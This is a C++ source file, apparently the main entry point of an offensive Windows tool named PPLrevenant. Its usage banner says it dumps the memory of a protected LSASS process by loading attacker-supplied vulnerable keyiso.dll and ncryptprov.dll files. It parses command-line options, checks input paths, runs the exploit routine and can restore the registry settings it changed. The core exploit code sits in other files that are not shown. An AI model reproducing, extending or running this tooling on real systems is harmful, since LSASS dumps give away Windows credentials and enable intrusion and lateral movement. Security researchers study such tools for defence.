#if !defined(_WIN64)
#error Only x64 architecture is supported.
#endif

#include "common.h"
#include "exploit.h"

#define CODE_VERSION L"0.1"
#define CODE_AUTHOR L"@itm4n"
#define CODE_BIN_NAME L"PPLrevenant.exe"

BOOL g_bDebug;

void PrintUsage();

int wmain(int argc, wchar_t* argv[])
{
    BOOL bResult = FALSE;
    BOOL bCommandParsingSuccess = FALSE, bSanityCheckSuccess = TRUE;
    EXPLOIT_PARAMETERS Param = { 0 };
    LPWSTR pwszInputFiles[3] = { 0 };

    --argc;
    ++argv;

    EXIT_ON_ERROR(argc == 0);
    while (argc)
    {
        EXIT_ON_ERROR(argv[0][0] != L'-');
        switch (argv[0][1])
        {
        case L'v':
            g_bDebug = TRUE; // Enable verbose / debug messages
            break;
        case L'f':
            Param.Force = TRUE; // Ignore safety checks
            break;
        case L'r':
            Param.Restore = TRUE; // Restore mode, restore system to original setttings
            break;
        case L'd':
            ++argv;
            --argc;
            EXIT_ON_ERROR(argc == 0 || argv[0][0] == '-');
            Param.KeyIsoDllPath = argv[0]; // Path to vulnerable KeyIso DLL
            break;
        case L'p':
            ++argv;
            --argc;
            EXIT_ON_ERROR(argc == 0 || argv[0][0] == '-');
            Param.ProviderDllPath = argv[0]; // Path to Key Storage Provider DLL
            break;
        case L'c':
            ++argv;
            --argc;
            EXIT_ON_ERROR(argc == 0 || argv[0][0] == '-');
            Param.CatalogPath = argv[0]; // Path to catalog file
            break;
        case L'o':
            ++argv;
            --argc;
            EXIT_ON_ERROR(argc == 0 || argv[0][0] == '-');
            Param.OutputDirectoryPath = argv[0]; // Path to output directory for the dump file
            break;
        }

        --argc;
        ++argv;
    }

    bCommandParsingSuccess = TRUE;

    //
    // We just want to restore system settings to their defaults,
    // so just do that and exit.
    //

    if (Param.Restore)
    {
        if (Param.Force)
        {
            bSanityCheckSuccess = TRUE;
            bResult = Exploit::Restore();
        }
        else
        {
            PRINT_WARNING(L"This will restore registry settings modified by this program to their default values. This should be ok in most cases. Use option '-f' to ignore this warning.");
        }
        
        goto cleanup;
    }

    //
    // Ensure that all provided file paths exist and are absolute.
    //

    pwszInputFiles[0] = Param.KeyIsoDllPath;
    pwszInputFiles[1] = Param.ProviderDllPath;
    pwszInputFiles[2] = Param.CatalogPath;

    for (int i = 0; i < sizeof(pwszInputFiles) / sizeof(*pwszInputFiles); i++)
    {
        if (!pwszInputFiles[i])
        {
            switch (i)
            {
            case 0:
                PRINT_ERROR(L"Missing vulnerable keyiso.dll path parameter (-d).");
                break;
            case 1:
                PRINT_ERROR(L"Missing vulnerable ncryptprov.dll path parameter (-p).");
                break;
            case 2:
                PRINT_ERROR(L"Missing catalog file path parameter (-c).");
                break;
            }
            bSanityCheckSuccess = FALSE;
            continue;
        }

        if (!Filesystem::PathExists(pwszInputFiles[i]))
        {
            PRINT_ERROR(L"Path not found: '%ws'.", pwszInputFiles[i]);
            bSanityCheckSuccess = FALSE;
            continue;
        }
    }

    //
    // Ensure that the target directory exists.
    //

    if (!Param.OutputDirectoryPath)
    {
        PRINT_ERROR(L"Missing output directory parameter (-o).");
        bSanityCheckSuccess = FALSE;
    }
    else
    {
        if (!Filesystem::PathIsAbsolute(Param.OutputDirectoryPath))
        {
            PRINT_ERROR(L"Path is not absolute: '%ws'.", Param.OutputDirectoryPath);
            bSanityCheckSuccess = FALSE;
        }
        else
        {
            if (!Filesystem::PathExists(Param.OutputDirectoryPath))
            {
                PRINT_ERROR(L"Path not found: '%ws'.", Param.OutputDirectoryPath);
                bSanityCheckSuccess = FALSE;
            }
            else
            {
                if (!(GetFileAttributesW(Param.OutputDirectoryPath) & FILE_ATTRIBUTE_DIRECTORY))
                {
                    PRINT_ERROR(L"Target path is not a directory: '%ws'.", Param.OutputDirectoryPath);
                    bSanityCheckSuccess = FALSE;
                }
            }
        }
    }

    EXIT_ON_ERROR(!bSanityCheckSuccess);

    bResult = Exploit::Main(&Param);

cleanup:
    if (!bCommandParsingSuccess || !bSanityCheckSuccess)
    {
        if (!bCommandParsingSuccess)
            PrintUsage();
    }
    else
    {
        if (Param.Restore)
        {
            bResult ? PRINT_SUCCESS(L"Restoration complete!") : PRINT_ERROR(L"Restoration failed.");
        }
        else
        {
            bResult ? PRINT_SUCCESS(L"Exploit complete!") : PRINT_ERROR(L"Exploit failed.");
        }
    }

    return 0;
}

void PrintUsage()
{
    wprintf(
        L""
        "  _____ _____ __                                _   \n"
        " |  _  |  _  |  |   ___ ___ _ _ ___ ___ ___ ___| |_ \n"
        " |   __|   __|  |__|  _| -_| | | -_|   | .'|   |  _|  version %ws\n"
        " |__|  |__|  |_____|_| |___|\\_/|___|_|_|__,|_|_|_|    by %ws\n"
        "\n"
        " Description:\n"
        "   Dump the memory of a protected LSASS process by bringing your\n"
        "   own vulnerable DLL(s).\n"
        "\n"
        " Usage:\n"
        "   %ws -d <PATH> -c <PATH> -p <PATH> -o <PATH> [-v] [-f]\n"
        "\n"
        " Parameters:\n"
        "   -d <PATH>   Path of a vulnerable 'keyiso.dll' file\n"
        "   -p <PATH>   Path of a vulnerable 'ncryptprov.dll' file\n"
        "   -c <PATH>   Path of a catalog file containing DLL signatures\n"
        "   -o <PATH>   Path of an output directory for the dump file\n"
        "   -v          Enable verbose / debug messages\n"
        "   -f          Continue on warnings\n"
        "   -r          Restore system (registry)\n"
        "\r\n"
        " Examples:\n"
        "   %ws -d \"keyiso_10.0.22621.1485.dll\" -p \"ncryptprov_10.0.22621.755.dll\" -c \"keyiso_10.0.22621.1485.cat\" -o \"C:\\temp\"\n"
        "\n",
        CODE_VERSION,
        CODE_AUTHOR,
        CODE_BIN_NAME,
        CODE_BIN_NAME
    );
}